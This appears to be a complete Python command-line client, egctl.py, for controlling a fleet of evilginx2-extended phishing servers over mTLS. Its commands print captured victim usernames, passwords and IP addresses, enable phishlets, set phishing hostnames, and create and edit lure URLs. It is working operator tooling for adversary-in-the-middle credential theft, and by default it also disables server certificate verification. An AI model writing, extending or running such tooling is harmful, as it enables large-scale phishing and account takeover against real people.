#!/usr/bin/env python3
"""egctl.py — multi-server remote control client for evilginx2-extended.

Pro-feature #1 (client-server fleet) client side. Runs on the operator PC
(Windows/Linux/macOS, Python 3 stdlib only). Talks to each server's mTLS REST
API (-api PORT) using the client certificate generated on the server at
~/.evilginx/api/{ca.crt, client.crt, client.key}.

Usage:
  python egctl.py servers.json status
  python egctl.py servers.json sessions
  python egctl.py servers.json phishlets
  python egctl.py servers.json enable <phishlet>
  python egctl.py servers.json disable <phishlet>
  python egctl.py servers.json lure-create <phishlet> [redirect_url]
  python egctl.py servers.json lure-url <phishlet> <id> [k=v ...]
  python egctl.py servers.json session-del <id>

servers.json:
  [
    {"name": "srv1", "host": "172.24.228.169", "port": 8443,
     "base": "/api-XXXXXXXXXXXX",
     "ca": "C:/path/ca.crt", "cert": "C:/path/client.crt", "key": "C:/path/client.key"}
  ]
"""
import json
import ssl
import sys
import urllib.parse
import urllib.request

# Lab posture: the API enforces client-certificate auth (mTLS); we do not
# verify the server certificate hostname because API certs are minted with
# SANs local to the server. Set VERIFY_SERVER=1 to enforce full verification.
VERIFY_SERVER = False


def make_sslctx(srv):
    if VERIFY_SERVER:
        ctx = ssl.create_default_context(cafile=srv["ca"])
    else:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    ctx.load_cert_chain(srv["cert"], srv["key"])
    return ctx


def call(srv, method, path, body=None):
    url = f"https://{srv['host']}:{srv['port']}{srv['base']}{path}"
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if data:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, context=make_sslctx(srv), timeout=15) as r:
            return r.status, json.loads(r.read().decode() or "{}")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:300]
    except Exception as e:
        return 0, f"{type(e).__name__}: {e}"


def main():
    if len(sys.argv) < 3:
        sys.exit(__doc__)
    servers = json.load(open(sys.argv[1]))
    cmd = sys.argv[2:]
    op = cmd[0]

    for srv in servers:
        name = srv.get("name", srv["host"])
        if op == "status":
            code, out = call(srv, "GET", "/status")
        elif op == "sessions":
            code, out = call(srv, "GET", "/sessions")
            if code == 200:
                out = [f"#{s['id']} {s['phishlet']} {s['username'] or '-'}:{s['password'] or '-'} {s['remote_addr']}" for s in out]
        elif op == "phishlets":
            code, out = call(srv, "GET", "/phishlets")
            if code == 200:
                out = [f"{p['name']}: {'enabled' if p['enabled'] else 'disabled'}{' hidden' if p['hidden'] else ''}" for p in out]
        elif op in ("enable", "disable"):
            code, out = call(srv, "POST", f"/phishlets/{cmd[1]}/{op}")
        elif op == "hostname":
            code, out = call(srv, "POST", f"/phishlets/{cmd[1]}/hostname", {"hostname": cmd[2]})
        elif op == "reload-phishlets":
            code, out = call(srv, "POST", "/phishlets/reload")
        elif op == "lures-list":
            code, out = call(srv, "GET", "/lures")
            if code == 200:
                out = [f"#{l['id']} {l['phishlet']} {l['path']} -> {l['redirect_url'] or '-'}" for l in out]
        elif op == "lure-edit":
            fields = {}
            for kv in cmd[2:]:
                k, _, v = kv.partition("=")
                fields[k] = v
            code, out = call(srv, "PUT", f"/lures/{cmd[1]}", fields)
        elif op == "lure-del":
            code, out = call(srv, "DELETE", f"/lures/{cmd[1]}")
        elif op == "lure-create":
            body = {"phishlet": cmd[1]}
            if len(cmd) > 2:
                body["redirect_url"] = cmd[2]
            code, out = call(srv, "POST", "/lures", body)
        elif op == "lure-url":
            qs = "&".join(urllib.parse.quote(c, safe="=._-") for c in cmd[3:])
            code, out = call(srv, "GET", f"/lures/{cmd[2]}/url" + (f"?{qs}" if qs else ""))
        elif op == "session-del":
            code, out = call(srv, "DELETE", f"/sessions/{cmd[1]}")
        else:
            sys.exit(f"unknown op: {op}\n" + __doc__)
        print(f"[{name}] {code} {out}")


if __name__ == "__main__":
    main()
